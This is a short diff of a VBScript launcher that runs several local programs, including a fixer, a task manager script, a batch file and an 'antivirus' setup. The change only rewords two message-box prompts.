@@ -16,9 +16,9 @@ If answer = vbYes Then
     CreateObject("WScript.Shell").Run "simple/BrokerFixer.exe"
     CreateObject("WScript.Shell").Run "simple/TaskManager.py"
     WScript.sleep(500)
-    d=MsgBox("Succesefull, close this prompt to run the next task", 0+64, "Simple")
+    d=MsgBox("Succesefull, close this prompt.", 0+64, "Simple")
     CreateObject("WScript.Shell").Run "simple/fix.bat"
-    f=MsgBox("Click any button below to run our simple antivirus.", 0+64, "Simple")
+    f=MsgBox("Close this prompt to run our antivirus.", 0+64, "Simple")
     CreateObject("WScript.Shell").Run "simple/complex/setup.exe"
  
   Else
